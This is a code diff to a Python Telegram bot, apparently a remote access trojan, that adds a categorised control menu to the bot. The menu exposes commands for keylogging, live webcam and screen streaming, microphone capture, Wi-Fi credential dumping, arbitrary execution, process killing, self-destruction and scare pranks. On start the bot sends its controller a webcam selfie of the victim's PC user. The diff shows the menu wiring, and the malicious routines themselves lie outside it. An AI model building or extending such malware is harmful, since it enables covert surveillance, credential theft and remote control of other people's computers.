@@ -236,7 +236,11 @@ END – Presses the End key.
 PAGEUP – Presses Page Up.
 PAGEDOWN – Presses Page Down."""
 
-HELP = r"""🛑 System & Shutdown
+HELP = r"""
+🏠 Main Menu
+mainmenu - Sends the main menu.
+
+🛑 System & Shutdown
 shutdown - Shut down the PC.
 fakeshutdown - Fake system shutdown.
 altf4 - Simulate Alt + F4.
@@ -1085,6 +1089,7 @@ class PeppinoTelegram:
         self.mouse_controller_menu = None
         self.processmonitormenu = None
         self.display_mode_keyboard  = None
+        self.main_menu_ref = None
         self.wifidumper = WifiDumper()
         self.all_session_messages: list[int] = []
 
@@ -1160,6 +1165,18 @@ class PeppinoTelegram:
             "mousel":self.mousel,
             "mouseu":self.mouseu,
             "moused":self.moused,
+            "mainmenu":self.main_menu,
+            "menu_system":self.menu_system,
+            "menu_network":self.menu_network,
+            "menu_camera":self.menu_camera,
+            "menu_audio":self.menu_audio,
+            "menu_pranks":self.menu_pranks,
+            "menu_control":self.menu_control,
+            "menu_input":self.menu_input,
+            "menu_messaging":self.menu_messaging,
+            "menu_cantopen":self.menu_cantopen,
+            "menu_keylogger":self.menu_keylogger,
+            "menu_misc":self.menu_misc,
             "leftclick":self.leftclick,
             "rightclick":self.rightclick,
             "nothing":lambda:...,
@@ -1463,6 +1480,187 @@ class PeppinoTelegram:
             pg.moveTo(pos)
         bar.fill_and_delete()
 
+    def main_menu(self):
+        buttons = {
+            "🛑 System & Shutdown": "/menu_system",
+            "🌐 Network & Remote Access": "/menu_network",
+            "📸 Camera & Screen": "/menu_camera",
+            "🔊 Audio & Volume": "/menu_audio",
+            "😈 Pranks & Visuals": "/menu_pranks",
+            "💻 System Control": "/menu_control",
+            "🎮 Input / Device Control": "/menu_input",
+            "📋 Messaging": "/menu_messaging",
+            "🔒 Can't Open List": "/menu_cantopen",
+            "🧠 Keylogger": "/menu_keylogger",
+            "🦑 Misc": "/menu_misc",
+        }
+        if self.main_menu_ref:
+            self.main_menu_ref.delete()
+        self.main_menu_ref = self.new_menu(buttons, label="Select a category:", close_btn_lab="main_menu_close")
+        return self.main_menu_ref
+
+    def menu_system(self):
+        buttons = {
+            "shutdown": "/shutdown",
+            "fakeshutdown": "/fakeshutdown",
+            "altf4": "/altf4",
+            "clear": "/clear",
+            "selfdestruction": "/selfdestruction",
+            "🔙 Back": "/main_menu"
+        }
+        if self.main_menu_ref:
+            self.main_menu_ref.delete()
+        self.main_menu_ref = self.new_menu(buttons, label="🛑 System & Shutdown", close_btn_lab="main_menu_close")
+        return self.main_menu_ref
+
+    def menu_network(self):
+        buttons = {
+            "wifiinfo": "/wifiinfo",
+            "getip": "/getip",
+            "🔙 Back": "/main_menu"
+        }
+        if self.main_menu_ref:
+            self.main_menu_ref.delete()
+        self.main_menu_ref = self.new_menu(buttons, label="🌐 Network & Remote Access", close_btn_lab="main_menu_close")
+        return self.main_menu_ref
+
+    def menu_camera(self):
+        buttons = {
+            "selfie": "/selfie",
+            "screenshot": "/screenshot",
+            "fullclip": "/fullclip",
+            "webcamclip": "/webcamclip",
+            "screenclip": "/screenclip",
+            "recordjum": "/recordjum",
+            "waitforface": "/waitforface",
+            "displaymode": "/displaymode",
+            "webcamstreamstart": "/webcamstreamstart",
+            "screenstreamstart": "/screenstreamstart",
+            "webcamstreamstop": "/webcamstreamstop",
+            "screenstreamstop": "/screenstreamstop",
+            "🔙 Back": "/main_menu"
+        }
+        if self.main_menu_ref:
+            self.main_menu_ref.delete()
+        self.main_menu_ref = self.new_menu(buttons, label="📸 Camera & Screen", next_btn=True, close_btn_lab="main_menu_close")
+        return self.main_menu_ref
+
+    def menu_audio(self):
+        buttons = {
+            "breath": "/breath",
+            "pss": "/pss",
+            "microphone": "/microphone",
+            "mutevolume": "/mutevolume",
+            "fullvolume": "/fullvolume",
+            "setvolume": "/setvolume",
+            "getvolume": "/getvolume",
+            "tralalerotralala": "/tralalerotralala",
+            "mixermenu": "/mixermenu",
+            "🔙 Back": "/main_menu"
+        }
+        if self.main_menu_ref:
+            self.main_menu_ref.delete()
+        self.main_menu_ref = self.new_menu(buttons, label="🔊 Audio & Volume", next_btn=True, close_btn_lab="main_menu_close")
+        return self.main_menu_ref
+
+    def menu_pranks(self):
+        buttons = {
+            "jumpscare": "/jumpscare",
+            "jumpscarenoaudio": "/jumpscarenoaudio",
+            "invertedscreen": "/invertedscreen",
+            "distortedscreen": "/distortedscreen",
+            "messagebox": "/messagebox",
+            "messagespam": "/messagespam",
+            "camerawallpaper": "/camerawallpaper",
+            "setvideowallpaper": "/setvideowallpaper",
+            "🔙 Back": "/main_menu"
+        }
+        if self.main_menu_ref:
+            self.main_menu_ref.delete()
+        self.main_menu_ref = self.new_menu(buttons, label="😈 Pranks & Visuals", next_btn=True, close_btn_lab="main_menu_close")
+        return self.main_menu_ref
+
+    def menu_control(self):
+        buttons = {
+            "execute": "/execute",
+            "processkiller": "/processkiller",
+            "terminateprocess": "/terminateprocess",
+            "procmonmenu": "/procmonmenu",
+            "procmonadd": "/procmonadd",
+            "procmonrem": "/procmonrem",
+            "🔙 Back": "/main_menu"
+        }
+        if self.main_menu_ref:
+            self.main_menu_ref.delete()
+        self.main_menu_ref = self.new_menu(buttons, label="💻 System Control", close_btn_lab="main_menu_close")
+        return self.main_menu_ref
+
+    def menu_input(self):
+        buttons = {
+            "randomkeyboard": "/randomkeyboard",
+            "capslock": "/capslock",
+            "mousecontroller": "/mousecontroller",
+            "mouselock": "/mouselock",
+            "🔙 Back": "/main_menu"
+        }
+        if self.main_menu_ref:
+            self.main_menu_ref.delete()
+        self.main_menu_ref = self.new_menu(buttons, label="🎮 Input / Device Control", close_btn_lab="main_menu_close")
+        return self.main_menu_ref
+
+    def menu_messaging(self):
+        buttons = {
+            "bsend": "/bsend",
+            "id": "/id",
+            "deletemessages": "/deletemessages",
+            "deleteallmessages": "/deleteallmessages",
+            "🔙 Back": "/main_menu"
+        }
+        if self.main_menu_ref:
+            self.main_menu_ref.delete()
+        self.main_menu_ref = self.new_menu(buttons, label="📋 Messaging", close_btn_lab="main_menu_close")
+        return self.main_menu_ref
+
+    def menu_cantopen(self):
+        buttons = {
+            "cantopenadd": "/cantopenadd",
+            "cantopenremove": "/cantopenremove",
+            "cantopenmenu": "/cantopenmenu",
+            "🔙 Back": "/main_menu"
+        }
+        if self.main_menu_ref:
+            self.main_menu_ref.delete()
+        self.main_menu_ref = self.new_menu(buttons, label="🔒 Can't Open List", close_btn_lab="main_menu_close")
+        return self.main_menu_ref
+
+    def menu_keylogger(self):
+        buttons = {
+            "keylogger": "/keylogger",
+            "livekeylogger": "/livekeylogger",
+            "🔙 Back": "/main_menu"
+        }
+        if self.main_menu_ref:
+            self.main_menu_ref.delete()
+        self.main_menu_ref = self.new_menu(buttons, label="🧠 Keylogger", close_btn_lab="main_menu_close")
+        return self.main_menu_ref
+
+    def menu_misc(self):
+        buttons = {
+            "plankton": "/plankton",
+            "planktonnoaudio": "/planktonnoaudio",
+            "johnpork": "/johnpork",
+            "johnporknoaudio": "/johnporknoaudio",
+            "gabinetti": "/gabinetti",
+            "duckyscript": "/duckyscript",
+            "duckyhelp": "/duckyhelp",
+            "browser": "/browser",
+            "🔙 Back": "/main_menu"
+        }
+        if self.main_menu_ref:
+            self.main_menu_ref.delete()
+        self.main_menu_ref = self.new_menu(buttons, label="🦑 Misc", next_btn=True, close_btn_lab="main_menu_close")
+        return self.main_menu_ref
+
     def new_editable_message(self, content: str, autosend: bool=True) -> EditableMessage:
         editable = EditableMessage(self.bot, self.owner_id, content, autosend)
         self.all_session_messages.append(editable.message_id)
@@ -1569,6 +1767,11 @@ class PeppinoTelegram:
                     self.processmonitorrem(process)
                     self.processmonitormenu.delete()
                     self.processmonitormenushow()
+
+        elif command.startswith("main_menu"):
+            if self.main_menu_ref:
+                if command == "main_menu_close":
+                    self.main_menu_ref.delete()
 
         else:
             self.bsend(f"Invalid command {command}")
@@ -1721,7 +1924,7 @@ class PeppinoTelegram:
     def pss(self) -> None:
         self.__play_loaded_sound("pss")
 
-    def quickmenu(self) -> int:
+    def replyquickmenu(self) -> int:
         commands = list(map(lambda x: f"/{x['command']}", self.commands))
         keyboard = [commands[i:i + 2] for i in range(0, len(commands), 2)]        
         return ReplyKeyboardMarkup(keyboard=keyboard, resize_keyboard=True)
@@ -2106,10 +2309,10 @@ class PeppinoTelegram:
         self.screen_width, self.screen_height = pg.size()
         botstartedmessage = f"Bot started now, you have acces to 👤{getlogin()}"
         if not sys.argv[1:]:
-            if not self.selfie(botstartedmessage, reply_markup=self.quickmenu()):
-                self.bsend(botstartedmessage, reply_markup=self.quickmenu())
+            if not self.selfie(botstartedmessage, reply_markup=self.replyquickmenu()):
+                self.bsend(botstartedmessage, reply_markup=self.replyquickmenu())
         else:
-            self.bsend(botstartedmessage, reply_markup=self.quickmenu())
+            self.bsend(botstartedmessage, reply_markup=self.replyquickmenu())
         loop = MessageLoop(self.bot, {"chat":self.handle, "callback_query":self.on_callback_query})
         loop.run_as_thread()
         while self.running:
